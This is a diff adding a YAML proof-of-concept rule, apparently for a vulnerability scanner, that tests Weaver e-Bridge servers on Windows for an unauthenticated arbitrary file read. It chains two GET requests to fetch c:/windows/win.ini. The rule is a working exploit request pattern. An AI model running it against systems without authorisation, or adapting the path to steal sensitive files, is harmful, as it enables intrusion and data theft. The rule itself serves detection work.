@@ -1,0 +1,19 @@
+name: poc-yaml-weaver-ebridge-file-read-windows
+rules:
+  - method: GET
+    path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"id")
+    search: |
+      \"id\"\:\"(?P<var>.+?)\"\,
+  - method: GET
+    path: /file/fileNoLogin/{{var}}
+    follow_redirects: false
+    expression: |
+      response.status == 200 && (response.body.bcontains(b"for 16-bit app support") || response.body.bcontains(b"[extensions]"))
+detail:
+  author: mvhz81
+  info: e-bridge-file-read for windows
+  links:
+    - https://mrxn.net/Infiltration/323.html
